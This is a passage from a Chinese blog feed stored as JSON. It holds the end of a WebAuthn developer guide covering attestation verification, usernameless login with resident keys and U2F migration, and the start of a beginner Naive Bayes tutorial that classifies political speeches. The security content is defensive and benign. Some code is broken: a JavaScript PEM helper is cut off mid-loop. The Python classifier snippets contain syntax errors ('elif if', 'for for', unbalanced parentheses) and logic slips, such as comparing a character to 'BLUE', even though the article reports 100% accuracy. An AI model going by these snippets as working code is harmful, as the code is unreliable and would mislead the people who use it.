wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 